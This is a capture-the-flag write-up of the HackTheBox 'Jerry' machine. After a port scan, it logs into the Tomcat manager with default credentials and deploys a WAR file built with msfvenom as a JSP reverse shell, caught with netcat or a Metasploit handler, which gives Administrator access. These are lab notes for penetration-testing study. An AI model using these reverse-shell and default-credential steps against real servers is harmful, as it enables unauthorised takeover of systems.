# Intro


Tags: #windows #WebApp #OSCPpath #FileUpload #easy

--------
# Reconnaissance

## Port scan

```shell
Nmap scan report for jerry.htb (10.129.145.195)  
Host is up (0.097s latency).  
  
PORT STATE SERVICE VERSION  
8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1  
|_http-server-header: Apache-Coyote/1.1  
|_http-favicon: Apache Tomcat  
|_http-title: Apache Tomcat/7.0.88  
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
```
only port `8080` open

## WebApp

navigating to `http://jerry.htb:8080`
![](MediaFiles/Pasted%20image%2020260927130403.png)
we see the default tomcat page

By clicking `Status` we are prompted to `/manager/status` and we are prompted to login popup
![](MediaFiles/Pasted%20image%2020260927130554.png)
then tried default creds `tomcat:s3cret` and we are in:
![](MediaFiles/Pasted%20image%2020260927130638.png)
thats interesting, here we can start, stop relaoad and remove running applications

-------
# Foothold

## File upload

### Payload via msfvenom

Also what's more interesting is the `War file to deploy` section where we can upload files! Since we can upload war files, lets find a way to embed a rev shell inside on and see if it will work:
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.247 LPORT=3333 -f war > shell.war
```

```shell
nc -lvnp 3333
```
start listener and upload, then got rev shell back!

alternatively, instead of `nc -lvnp` u could use metasploit (but i dont prefer it as OSCP prep as it's usage on exam is limited):
```shell
msf exploit(multi/handler) > set payload java/meterpreter/reverse_tcp

payload => java/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost 10.10.14.247

lhost => 10.10.14.247

msf exploit(multi/handler) > set lport 3333

lport => 3333

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.247:3333
```
then u would receive the meterpreter shell:
```shell
[*] Sending stage (53837 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.247:3333 -> 10.10.10.95:49201) at 2026-09-02 08:16:34 -0500

meterpreter >
```

once in , grabbed user flag

----
# Privesc

## Shell as Administrator

grabbed root flag too, that was easy because the initial revshell landed us inside the target as Administrator directly

-------
# Summary



------
# Sidenotes


One of the easier machines around, upon receiving rev shell on tomcat u become Administrator instantly basically.


